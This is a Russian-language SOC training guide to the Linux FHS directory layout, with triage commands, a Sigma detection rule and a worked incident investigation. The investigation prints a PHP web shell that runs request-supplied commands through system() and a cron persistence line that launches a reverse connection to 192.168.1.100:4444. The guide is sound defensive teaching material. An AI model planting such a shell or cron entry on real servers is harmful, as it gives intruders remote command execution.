# Иерархия FHS и назначение ключевых каталогов в Linux

## 1. Контекст и базовые понятия

**Filesystem Hierarchy Standard (FHS)** — стандарт, регламентирующий расположение файлов и каталогов общего назначения в операционных системах семейства UNIX, прежде всего в Linux. Его главная задача — обеспечить единообразие файловой структуры между различными дистрибутивами, чтобы прикладное программное обеспечение, системные утилиты и административные сценарии могли предсказуемо находить необходимые данные вне зависимости от конкретного варианта ОС. Стандарт разрабатывается и поддерживается организацией Linux Foundation на площадке FreeDesktop.org; последняя на сегодняшний день версия — **FHS 3.0**, анонсированная 3 июня 2015 года [FHS — Википедия](https://ru.wikipedia.org/wiki/FHS).

Истоки стандартизации восходят к 1994 году, когда начались попытки упорядочить разнородные файловые структуры многочисленных UNIX-подобных систем. К тому времени каждый производитель (Sun, HP, IBM) и даже отдельные дистрибутивы Linux использовали собственную логику размещения системных файлов. Это создавало серьёзные препятствия для разработчиков кроссплатформенных приложений и усложняло администрирование. FHS стал ответом на потребность в унификации: он определил требования и рекомендации по размещению каталогов и файлов, основываясь на их функциональном назначении и степени изменяемости [Filesystem Hierarchy Standard](https://refspecs.linuxfoundation.org/FHS_3.0/fhs/index.html).

В основе FHS лежит иерархическая древовидная структура с единственным корнем — каталогом `/`. Все остальные каталоги и файлы, независимо от того, на каком физическом носителе они фактически расположены, являются потомками корня. Это фундаментальное отличие от систем типа Windows, где каждое блочное устройство получает собственное буквенное обозначение и образует отдельное дерево. В Linux-системах концепция «всё есть файл» распространена и на аппаратные компоненты: накопители, терминалы, даже запущенные процессы представлены в виде файлов специального типа в определённых точках файловой системы.

**Важное разграничение.** FHS не описывает типы файловых систем (ext4, XFS, tmpfs) и не регламентирует их внутреннее устройство — за это отвечают драйверы и проект VFS (Virtual File System). Стандарт задаёт исключительно **семантику верхнего уровня** — какие каталоги должны присутствовать, каково их назначение и какими свойствами они должны обладать. Например, согласно FHS каталог `/usr` должен быть доступен для монтирования в режиме «только чтение» и может разделяться между несколькими хостами по сети, а `/var` предназначен для часто изменяющихся данных, и размещение его на отдельном разделе защищает корневую файловую систему от переполнения. Эти соглашения прямо влияют на проектирование систем хранения и стратегию резервного копирования в корпоративной среде.

Для специалиста SOC L1 критически важно не просто знать перечень каталогов, а понимать **принципиальное различие** между системными и пользовательскими данными, статическим и динамическим содержимым, а также уметь соотнести тип искомого артефакта (лог, конфигурация, временный файл, исполняемый модуль) с его наиболее вероятным местоположением согласно FHS. Такое знание многократно ускоряет первичную сортировку инцидента и позволяет сразу сузить область поиска индикаторов компрометации.

Нижеприведённая таблица иллюстрирует ключевые различия между традиционной для Linux структурой по FHS и организацией файловой системы в Windows — контраст, полезный для специалистов, начинающих переход с Windows-инфраструктур.

| Критерий                  | Linux (FHS)                                                      | Windows (условно для сравнения)                           |
|---------------------------|------------------------------------------------------------------|-----------------------------------------------------------|
| Корень иерархии           | Единый `/`, объединяющий все устройства и разделы                | Буквы дисков (`C:\`, `D:\`), каждое устройство — отдельное дерево |
| Системные бинарные файлы  | `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` — разделение по приоритету и назначению | `C:\Windows\System32` — единый каталог для всех системных исполняемых файлов |
| Конфигурационные файлы    | `/etc` — единая точка для всей системы                           | Реестр Windows + отдельные файлы в каталогах программ (`Program Files`, `ProgramData`) |
| Пользовательские данные   | `/home/username` — изолированные домашние каталоги               | `C:\Users\username`                                       |
| Временные файлы           | `/tmp` (сбрасывается при перезагрузке), `/var/tmp` (сохраняется) | `%TEMP%` и `%TMP%` (поведение зависит от приложения)     |
| Лог-файлы                 | `/var/log` — централизованное хранилище                          | `C:\Windows\Logs`, журналы событий (Event Log), разнесены |
| Представление устройств   | Файлы устройств в `/dev`                                         | Пространство имён `\\.\PhysicalDriveX`, не всегда видны как файлы |
| Информация о процессах    | Виртуальная файловая система `/proc` (каждый процесс как каталог) | Утилиты вроде Task Manager, API Win32, нет прямого файлового представления |

Соблюдение FHS гарантирует, что любой администратор, владеющий стандартом, сможет без раскачки ориентироваться в незнакомом дистрибутиве — будь то сервер на Red Hat Enterprise Linux, рабочая станция на Ubuntu или встроенное устройство на базе Debian. Именно эта предсказуемость делает FHS краеугольным камнем при построении процедур мониторинга, резервного копирования, а также при разработке сигнатур обнаружения вторжений (IDS/IPS, Sigma-правил), которые часто опираются на фиксированные пути к целевым файлам.

## 2. Внутреннее устройство иерархии FHS: полный обзор ключевых каталогов

Хотя FHS определяет сотни деталей, для практической работы SOC-аналитику достаточно освоить двухуровневую модель: **каталоги первого уровня** (принадлежащие корню) и **наиболее значимые подкаталоги** внутри `/usr`, `/var` и `/etc`. Стандарт группирует каталоги по нескольким сквозным признакам: статические/динамические данные, разделяемое/локальное содержимое, обязательные/опциональные элементы. Ниже представлен всесторонний обзор всех каталогов, которые современный специалист обязан отличать безошибочно.

### 2.1. Каталоги первого уровня под `/`

Каждый из следующих каталогов находится непосредственно в корне и играет собственную чётко определённую роль в жизнеобеспечении системы.

- **`/` (корень)** — вершина иерархии. Все остальные каталоги и файлы смонтированы под ним, даже если физически расположены на других разделах. Минимальный набор каталогов в корне должен позволять загрузку системы и восстановление в однопользовательском режиме.
- **`/bin`** — основные исполняемые файлы, необходимые всем пользователям в однопользовательском режиме и при начальной загрузке. Содержит команды вроде `ls`, `cp`, `cat`, `sh`. Во многих современных дистрибутивах `/bin` является символической ссылкой на `/usr/bin` в результате слияния (проект UsrMove), но семантически это всё ещё каталог базовых утилит.
- **`/sbin`** — системные бинарные файлы, предназначенные для администрирования и обслуживания системы. Сюда входят `fsck`, `reboot`, `ifconfig`, `fdisk`. Традиционно доступ к каталогу ограничен суперпользователем, хотя современные дистрибутивы могут разрешать обычным пользователям выполнять отдельные утилиты (например, `ip` вместо `ifconfig`). Аналогично `/bin` часто является ссылкой на `/usr/sbin`.
- **`/boot`** — статические файлы, необходимые для загрузки системы: образ ядра (`vmlinuz`), файлы начального виртуального диска (`initrd` или `initramfs`), конфигурация загрузчика (GRUB), иногда таблица символов `System.map`. Этот каталог часто размещается на отдельном разделе, чтобы BIOS/UEFI могли напрямую читать загрузочные файлы. Изменения в `/boot` критичны: вредоносная модификация ядра или параметров загрузчика может обеспечить персистентность на уровне до запуска ОС.
- **`/dev`** — каталог файлов устройств. Здесь физические и виртуальные устройства представлены специальными файлами: `/dev/sda` (первый SCSI/SATA диск), `/dev/tty1` (первый терминал), `/dev/null` (приёмник, уничтожающий данные), `/dev/random` (генератор энтропии). SOC-аналитик должен помнить, что наличие нестандартных устройств (например, `/dev/hidden` или `/dev/.evil`) может указывать на руткит, маскирующий вредоносные компоненты.
- **`/etc`** — центральное хранилище системных конфигурационных файлов. В отличие от Windows, где настройки могут быть разбросаны по реестру и каталогам программ, в Linux все общесистемные текстовые конфигурации собраны здесь: `/etc/passwd` (учётные записи), `/etc/shadow` (хэши паролей), `/etc/ssh/sshd_config` (параметры SSH-сервера), `/etc/fstab` (таблица монтирования файловых систем). Часто именно в `/etc` злоумышленники оставляют свои следы — добавляют cron-задачи, изменяют сценарии инициализации, создают новых пользователей. Каталог обычно смонтирован на корневом разделе, чтобы быть доступным на самых ранних стадиях загрузки.
- **`/home`** (опционально) — домашние каталоги обычных пользователей. Здесь хранятся личные файлы, пользовательские конфигурации и кэш. С точки зрения безопасности это точка сбора улик: история команд (`~/.bash_history`), SSH-ключи (`~/.ssh/`), профили оболочек (`~/.profile`), а также подозрительные загрузки и скрипты.
- **`/lib`** — основные разделяемые библиотеки и модули ядра, необходимые для загрузки системы и работы утилит из `/bin` и `/sbin`. Включает динамические библиотеки стандартного C (`libc.so.*`), подсистемы PAM, криптографические модули. При компрометации подмена библиотек — классический метод перехвата функций (LD_PRELOAD, руткиты пользовательского пространства). Аналогично бинарным каталогам, `/lib` во многих системах теперь ссылается на `/usr/lib`.
- **`/media`** — точка монтирования для сменных носителей (CD-ROM, USB-флеш). Система автомонтирования обычно создаёт здесь подкаталоги вроде `/media/usb0`. SOC-аналитики должны следить за появлением неавторизованных или внезапно смонтированных устройств, которые могут использоваться для эксфильтрации данных.
- **`/mnt`** — каталог для временного монтирования файловых систем администратором. Историческое место; в современных системах долговременные внешние диски чаще монтируются в `/media` или в произвольные точки. Однако вредоносное ПО иногда использует `/mnt` для монтирования, чтобы скрыть содержимое от беглого взгляда.
- **`/opt`** — зарезервирован для установки дополнительных программных пакетов, не входящих в стандартный набор дистрибутива. Коммерческие приложения, самостоятельно скомпилированное ПО или большие среды (например, Google Chrome, MATLAB, крупные IDE) обычно размещаются в `/opt/<имя_пакета>`. Структура внутри `/opt` аналогична `/usr` (с подкаталогами `bin`, `lib`, `share`). При расследовании стоит искать в `/opt` несанкционированно установленные инструменты или бэкдоры.
- **`/proc`** — виртуальная файловая система, предоставляющая интерфейс к внутренним структурам ядра. Здесь нет реальных файлов на диске; всё содержимое генерируется на лету. Каждый процесс представлен каталогом `/proc/[pid]`, содержащим `/proc/[pid]/cmdline` (командная строка), `/proc/[pid]/exe` (символическая ссылка на исполняемый файл), `/proc/[pid]/fd` (открытые дескрипторы). Для SOC `/proc` — бесценный источник оперативной информации: список запущенных процессов, карта памяти, сетевые соединения (`/proc/net/tcp`) и параметры ядра (`/proc/sys`). Вредоносное ПО часто пытается скрыть свои процессы от стандартного `ps`, манипулируя `/proc`, поэтому прямое изучение записей в `/proc` может выявить несоответствия.
- **`/root`** (опционально) — домашний каталог суперпользователя. Не является подкаталогом `/home`, а расположен в корне, чтобы root мог войти в систему даже при проблемах с монтированием `/home`. Наличие в `/root` подозрительных скриптов или чужих SSH-ключей — явный признак компрометации учётной записи суперпользователя.
- **`/run`** — каталог для временных данных времени выполнения (run-time variable data), появившийся в FHS 3.0 и заменивший устаревший `/var/run`. Реализуется как tmpfs (файловая система в оперативной памяти), поэтому его содержимое теряется после перезагрузки. Здесь хранятся PID-файлы демонов, сокеты, файлы блокировок, информация о состоянии сетевых интерфейсов. SOC-аналитик может использовать `/run` для проверки активности сервисов — например, `systemd` создаёт здесь файлы, отражающие статус юнитов.
- **`/srv`** — данные, предоставляемые серверными службами системы. Например, `/srv/www` — файлы веб-сервера, `/srv/ftp` — файлы FTP-сервера. Если веб-приложение скомпрометировано, статический вредоносный контент или веб-шеллы нередко оседают именно здесь.
- **`/sys`** — ещё одна виртуальная файловая система, аналогичная `/proc`, но предназначенная для представления информации о ядре, драйверах и устройствах в структурированном виде. Через `/sys` можно управлять параметрами оборудования и энергосбережения, получать сведения о шинах и модулях. Для нужд SOC актуальна информация о загруженных модулях ядра (`/sys/module/`), которая позволяет выявить инжектированные LKM-руткиты.
- **`/tmp`** — каталог для временных файлов, доступный на запись всем пользователям. По FHS содержимое `/tmp` может быть удалено при перезагрузке, хотя на практике многие дистрибутивы этого не делают. С точки зрения безопасности `/tmp` — благоприятная среда для атак: злоумышленники часто загружают сюда вредоносные скрипты, выполняют их и удаляют. Наличие стóящих битов SUID/SGID на файлах в `/tmp` — почти всегда индикатор атаки. Мониторинг `/tmp` на появление подозрительных исполняемых файлов — обязательная часть операций SOC.

### 2.2. Иерархия `/usr` и `/var`

Детализация этих двух каталогов критична, так как в них сосредоточена основная масса системных и прикладных данных.

#### `/usr` — вторичная иерархия для разделяемых, преимущественно статических данных

FHS определяет `/usr` как вторичную файловую систему, которая может быть смонтирована в режиме «только чтение» и потенциально разделяться между несколькими хостами по сети (например, через NFS). Основные подкаталоги:

- **`/usr/bin`** — основные пользовательские команды, не требующиеся для загрузки в однопользовательском режиме (в отличие от `/bin`): компиляторы, интерпретаторы, X-утилиты, большинство прикладных программ.
- **`/usr/sbin`** — небазовые системные утилиты: демоны сетевых служб, серверы печати, инструменты мониторинга.
- **`/usr/lib`** — библиотеки для поддержки приложений из `/usr/bin` и `/usr/sbin`, а также внутренние бинарные модули (например, `/usr/lib/systemd`).
- **`/usr/local`** — третичная иерархия для программного обеспечения, устанавливаемого локально администратором в обход пакетного менеджера. Повторяет структуру `/usr` (`bin`, `lib`, `share` и т.д.). Компиляция из исходных кодов с `./configure && make install` обычно размещает результаты именно сюда. При расследовании инцидентов здесь могут быть обнаружены самодельные руткиты, бэкдоры или утилиты, скомпилированные злоумышленником.
- **`/usr/share`** — архитектурно-независимые данные: документация, темы оформления, файлы локализации, статические данные приложений (например, словари IDS-сигнатур).

#### `/var` — иерархия для изменяющихся данных

Эта точка монтирования предназначена для данных, которые активно изменяются в процессе нормальной работы системы: логи, очереди, кэши, состояния сервисов. По рекомендации FHS для `/var` часто выделяют отдельный раздел, чтобы его переполнение не нарушило работу корневой файловой системы.

- **`/var/log`** — журналы системы и приложений: `syslog`, `auth.log`, `kern.log`, `apache2/access.log`, `audit/audit.log`. Это «чёрный ящик» любого расследования: почти любая вредоносная активность, взаимодействие с сетью, неудачные аутентификации, исполнение команд с повышенными привилегиями — всё это фиксируется (или должно фиксироваться) здесь. SOC-аналитик должен уметь быстро извлекать из логов таймлайны событий, коррелировать записи из разных источников и выявлять аномалии.
- **`/var/spool`** — очереди задач, ожидающих обработки: печати, исходящей почты (`/var/spool/mail`), crontab-задачи (`/var/spool/cron/crontabs`). Злоумышленники часто добавляют свои задачи в cron для обеспечения персистентности или запуска маячков C2.
- **`/var/tmp`** — временные файлы, которые должны сохраняться между перезагрузками (в отличие от `/tmp`). Используется некоторыми приложениями для долгоживущих временных данных. Мониторинг наряду с `/tmp` необходим, так как вредоносное ПО может использовать этот каталог для хранения бинарных нагрузок, которые не должны пропадать после перезагрузки.
- **`/var/lib`** — постоянные данные состояния приложений: базы данных (`/var/lib/mysql`), состояние пакетного менеджера, метаданные Docker, виртуальных машин. Компрометация здесь может означать устойчивое закрепление на уровне данных.
- **`/var/cache`** — кэши приложений, сгенерированные локально для ускорения доступа (например, кэш apt, кэш веб-прокси). Данные не являются критичными и могут быть удалены без потери функциональности. Однако кэш может хранить следы ранее загруженных вредоносных файлов, что иногда используется при форензике.
- **`/var/run`** — в FHS 3.0 заменён на `/run`, но для обратной совместимости может присутствовать в виде символической ссылки. Исторически содержал PID-файлы, сокеты, файлы блокировок.

### 2.3. Визуализация иерархии и категоризация

Для быстрой ориентации полезна следующая ASCII-схема, отражающая основные связи и деление на статические/динамические данные:

```text
/ (root)
├── bin -> usr/bin      ────────┐
├── sbin -> usr/sbin    ────────┤  Статические, базовые; доступны до
├── lib -> usr/lib      ────────┘  монтирования /usr
├── boot                стат. ядро, загрузчик
├── dev                 сп.файлы устройств (динамически)
├── etc                 стат. конфигурации  ─── Ядро расследования
├── home                данные пользователей
├── media, mnt          точки монтирования (перем.)
├── opt                 доп. стат. ПО
├── proc                вирт. процессы (псевдо-ФС)
├── root                домашний каталог root
├── run                 врем. состояние (tmpfs) ── динамические
├── srv                 стат. данные сервисов
├── sys                 вирт. ядро/устройства (псевдо-ФС)
├── tmp                 врем. файлы (все пользователи)
└── usr
    ├── bin              осн. команды
    ├── sbin             небазовые системные утилиты
    ├── lib              библиотеки
    ├── local            локально установленное ПО
    └── share            арх.-независимые данные
└── var
    ├── log              журналы (ключевой артефакт)
    ├── spool            очереди, cron
    ├── tmp              сохраняемые врем. файлы
    └── lib              состояние приложений
```

Такая схема помогает мысленно классифицировать целевой объект поиска: если нужен лог успешных аутентификаций — идём в `/var/log`; если подозрение на изменённую конфигурацию SSH — `/etc/ssh/sshd_config`; если надо проверить процессы — `/proc`.

Дополнительно, сравнительная таблица каталогов с точки зрения SOC-аналитика:

| Каталог      | Что искать при инциденте                                       | Тип данных        | Индикаторы компрометации                                 |
|--------------|----------------------------------------------------------------|-------------------|----------------------------------------------------------|
| `/etc`       | Конфиги, cron, скрипты инициализации, реестр пользователей     | Статические       | Нелегитимные cron-записи, изменения в /etc/passwd, новые сервисы |
| `/var/log`   | Все системные и прикладные логи                                | Динамические      | События аутентификации, ошибки, сетевые подключения      |
| `/tmp` и `/var/tmp` | Временные файлы всех пользователей                       | Динамические      | Исполняемые файлы, скрипты, архивы с эксплоитами          |
| `/proc`      | Информация о процессах, сеть, память                           | Виртуальные       | Скрытые процессы, аномальные cmdline, подозрительные маппинги |
| `/home`      | Файлы пользователей, история, SSH-ключи                        | Статические       | Несанкционированные SSH-ключи, вредоносные скрипты        |
| `/usr/bin`, `/usr/sbin` | Системные исполняемые файлы                        | Статические       | Подмена файлов, подозрительные бинарники с SUID           |
| `/root`      | Данные суперпользователя                                       | Статические       | Чужие скрипты, история команд злоумышленника              |
| `/opt`       | Стороннее ПО                                                   | Статические       | Неизвестные приложения, скомпилированные трояны           |
| `/run`       | PID-файлы, сокеты                                              | Временные (tmpfs) | Работа демонов, наличие неизвестных сокетов               |

Знание этой структуры и разбивки по типам данных позволяет специалисту SOC L1 за считанные секунды определить, куда смотреть в первую очередь, корректно ставить таски для инструментов мониторинга и давать первичную оценку severity события.

## 3. Применение FHS в работе SOC-аналитика: инструменты и процедуры

Теоретическое знание структуры каталогов бесполезно без умения оперативно извлекать из неё доказательную базу. В этом разделе мы рассмотрим практические приёмы исследования файловой системы, типичные для первой линии мониторинга безопасности.

### 3.1. Процедуры базового сбора артефактов

При получении алерта о возможной компрометации SOC-аналитик должен в течение нескольких минут выполнить набор проверок, локализующих источник инцидента. Приведённые ниже примеры демонстрируют команды, которые позволяют получить объективную картину на основе стандартных путей FHS. **Важно:** на реальных системах конкретные значения дат, имён, PID и IP будут отличаться; иллюстративные выводы показаны с сохранением формата полей.

#### Поиск недавно изменённых конфигурационных файлов в `/etc`

Изменение системных конфигураций — один из ключевых признаков закрепления злоумышленника. Команда `find` с сортировкой по времени изменения позволяет быстро выявить, что менялось в течение последних суток.

```bash
find /etc -type f -mtime -1 -printf '%T+ %p\n' | sort -r
```

**Ожидаемый вывод (иллюстративная схема):**

```
2025-03-17 14:45:23.1234567890 +0300 /etc/crontab
2025-03-17 12:10:05.9876543210 +0300 /etc/ssh/sshd_config
2025-03-17 04:02:11.1111111111 +0300 /etc/passwd
```

Анализируя этот вывод, SOC-аналитик видит, что файл `/etc/crontab` изменялся позже всех — возможная точка персистентности. Следует немедленно проверить его содержимое.

#### Проверка временных каталогов на наличие исполняемых файлов

Каталоги `/tmp` и `/var/tmp` не должны содержать исполняемых файлов с установленными битами SUID/SGID или вовсе бинарных ELF-файлов, если только приложение явно не использует их. Поиск всех исполняемых ELF-файлов:

```bash
find /tmp /var/tmp -type f -exec file {} \; | grep ELF
```

**Ожидаемый вывод (иллюстративная схема):**

```
/tmp/.X11-unix/x1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped
```

Если в выводе появляется неожиданный исполняемый файл во временном каталоге, это с высокой вероятностью указывает на активность вредоносного ПО.

#### Анализ каталога `/proc` для выявления подозрительных процессов

Каждый запущенный процесс имеет запись в `/proc`. Можно быстро пройти по всем PID и вывести командную строку, чтобы обнаружить необычные процессы, запущенные из `/tmp` или без имени команды.

```bash
for pid in /proc/[0-9]*; do
    if [ -r "$pid/cmdline" ]; then
        cmdline=$(tr '\0' ' ' < "$pid/cmdline")
        exe=$(readlink "$pid/exe" 2>/dev/null)
        echo "PID $(basename $pid): CMDLINE='$cmdline' EXE='$exe'"
    fi
done 2>/dev/null
```

**Ожидаемый вывод (фрагмент):**

```
PID 1256: CMDLINE='/usr/sbin/sshd -D' EXE='/usr/sbin/sshd'
PID 1450: CMDLINE='/tmp/.hidden/.backconnect' EXE='/tmp/.hidden/.backconnect (deleted)'
```

Процесс, запущенный из `/tmp` и уже с пометкой `(deleted)`, — классический признак техники скрытия. Злоумышленник запустил вредоносный файл, после чего удалил его, но процесс продолжает выполняться.

### 3.2. Мониторинг целостности системных каталогов

В SOC часто требуется периодически сверять контрольные суммы критических исполняемых файлов. Инструменты вроде `AIDE` или `Tripwire` делают это автоматически, но ручная проверка также возможна:

```bash
md5sum /usr/bin/ls /bin/ls /usr/sbin/sshd /sbin/init
```

**Иллюстративный вывод:**

```
d41d8cd98f00b204e9800998ecf8427e  /usr/bin/ls
d41d8cd98f00b204e9800998ecf8427e  /bin/ls
c3d0e9526e5c9886cad761a010b85cb6  /usr/sbin/sshd
1c7d4fb7b7ebe7a72900f00c3ef2afb1  /sbin/init
```

Сравнение с эталонными хэшами (из базы с доверенной системы) выявит подмену бинарных файлов.

### 3.3. Типовые ошибки и подводные камни

При использовании FHS в качестве опоры для расследования следует избегать нескольких распространённых заблуждений:

- **Предположение, что `/bin` и `/usr/bin` всегда физически разделены.** В большинстве современных дистрибутивов они объединены символическими ссылками. При указании путей в правилах детекции необходимо проверять реальную структуру целевой системы.
- **Игнорирование `/run`.** После введения FHS 3.0 многие PID-файлы и сокеты перенесены из `/var/run` в `/run`. Поиск PID-файла демона в старом месте может привести к ложному выводу, что демон не запущен.
- **Полагание, что `/tmp` очищается при каждой перезагрузке.** Это не гарантируется; реальное поведение зависит от настроек `systemd-tmpfiles` или cron-заданий. Вредоносный файл может оставаться в `/tmp` неопределённо долго.
- **Путаница между `/mnt` и `/media`.** Некоторые дистрибутивы монтируют USB-устройства в `/media/<label>`, тогда как злоумышленник может вручную смонтировать в `/mnt/evil`. Необходимо проверять обе точки.
- **Пренебрежение `/opt`.** Многие SOC-аналитики по привычке ищут вредоносное ПО только в стандартных путях, пропуская `/opt`, где может размещаться, например, установленный злоумышленником сетевой сканер или инструмент горизонтального перемещения.

### 3.4. Инструментарий для автоматизации осмотра

Хотя ручные команды незаменимы для срочного триажа, в SOC широко используются инструменты, в основе которых лежит знание FHS:

- **Osquery** — позволяет выполнять SQL-запросы к системе, получая данные из `/proc` (`processes`, `process_open_sockets`), информацию о файлах (`file`), модулях ядра (`kernel_modules`).
- **Velociraptor** — агент для сбора артефактов, который использует VQL-запросы и может целенаправленно обходить каталоги согласно FHS-путям.
- **Sigma-правила** — формат описания детектов, часто оперирующий полями `Image`, `CommandLine`, `TargetFilename`, для которых знание типичных путей критично.

Например, Sigma-правило для обнаружения выполнения из `/tmp` (иллюстративная структура):

```yaml
title: Execution from /tmp or /var/tmp
status: experimental
logsource:
    category: process_creation
detection:
    selection:
        Image|startswith:
            - '/tmp/'
            - '/var/tmp/'
    condition: selection
level: high
```

Понимание FHS превращает написание и настройку таких правил из шаблонной работы в осмысленную инженерную задачу.

## 4. Сквозной практический пример: расследование подозрительной активности на Linux-сервере

**Исходные условия.** SOC L1 получает алерт из SIEM-системы: на веб-сервере под управлением Ubuntu 22.04 зафиксированы многократные попытки подключения к нестандартному порту на внешнем IP, исходящие от процесса `nginx`. Поскольку `nginx` сам по себе не должен инициировать внешние соединения, возникает подозрение на веб-шелл или эксплуатацию уязвимости. У аналитика есть SSH-доступ к серверу для первичного сбора данных. Задача: быстро определить масштаб инцидента, опираясь на знание FHS.

### Шаг 1. Поиск недавно изменённых или подозрительных файлов в области веб-контента и конфигураций

Сначала проверяем каталог `/srv/www` (согласно FHS здесь размещаются данные веб-сервера), а также `/etc/nginx` на предмет свежих изменений.

```bash
find /srv/www /etc/nginx -type f -mtime -1 -printf '%T+ %p\n' | sort -r
```

**Ожидаемый вывод (иллюстративная схема):**

```
2025-03-17 14:45:10.1234567890 +0300 /srv/www/upload/images.php
2025-03-17 14:40:05.9876543210 +0300 /etc/nginx/sites-enabled/default
```

Файл `images.php` в каталоге загрузок выглядит подозрительно и имеет недавнее время изменения. Проверим его содержимое:

```bash
head -n 20 /srv/www/upload/images.php
```

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Это классический однострочный веб-шелл, позволяющий выполнять произвольные команды на сервере.

### Шаг 2. Анализ временных каталогов на предмет дополнительных нагрузок

Злоумышленники часто загружают в `/tmp` или `/var/tmp` инструменты для пост-эксплуатации. Поищем недавно созданные исполняемые файлы:

```bash
find /tmp /var/tmp -type f -mtime -1 -exec file {} \; | grep -i 'executable\|script'
```

**Ожидаемый вывод:**

```
/tmp/.rsync: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped
```

Обнаружен скрытый исполняемый файл `.rsync`. Возможно, это инструмент закрепления или туннелирования. Для осторожной идентификации можно извлечь строки:

```bash
strings /tmp/.rsync | head -20
```

Вывод может содержать указание на IP-адрес C2 или параметры шифрования.

### Шаг 3. Исследование запущенных процессов через `/proc`

Необходимо выяснить, активен ли в данный момент вредоносный процесс, и не маскируется ли он. Используем цикл для поиска процессов, запущенных из временных каталогов или имеющих подозрительные имена:

```bash
for pid in /proc/[0-9]*; do
  exe=$(readlink "$pid/exe" 2>/dev/null)
  if [[ "$exe" == /tmp/* || "$exe" == /var/tmp/* ]]; then
    cmdline=$(tr '\0' ' ' < "$pid/cmdline")
    echo "[!] PID $(basename $pid): EXE=$exe CMDLINE='$cmdline'"
  fi
done
```

**Ожидаемый вывод:**

```
[!] PID 5823: EXE=/tmp/.rsync (deleted) CMDLINE='/tmp/.rsync -e aes-128-cbc 192.168.1.100 4444'
```

Процесс `5823` запущен из файла `.rsync`, который уже удалён с диска (типичная техника сокрытия), и инициирует шифрованное обратное соединение на IP `192.168.1.100:4444`. Это прямой индикатор компрометации.

### Шаг 4. Проверка системных конфигураций на предмет персистентности

Злоумышленник мог добавить cron-задачу для перезапуска своего агента. Проверим crontab root и системные файлы cron:

```bash
cat /etc/crontab /var/spool/cron/crontabs/* /var/spool/cron/root 2>/dev/null
```

**Возможный вывод:**

```
# /etc/crontab: system-wide crontab
...
*/5 * * * * root /tmp/.rsync -e aes-128-cbc 192.168.1.100 4444
```

Подтверждена персистентность: каждые 5 минут вредоносный файл будет выполняться повторно.

### Ожидаемый вывод примера

Проведённые шаги демонстрируют, как знание иерархии FHS позволило за 5-10 минут:
- Идентифицировать первоначальную точку входа (веб-шелл в `/srv/www/upload`).
- Обнаружить загруженный исполняемый файл во временном каталоге `/tmp`.
- Получить PID и командную строку активного вредоносного процесса через `/proc`.
- Найти механизм персистентности в конфигурационных каталогах `/etc` и `/var/spool/cron`.

Каждый шаг опирался на строго стандартизированные пути, что исключило необходимость гадать о местоположении артефактов. Такой подход минимизирует время реакции и позволяет быстро передать эскалированную информацию на следующий уровень SOC с максимальной полнотой контекста.
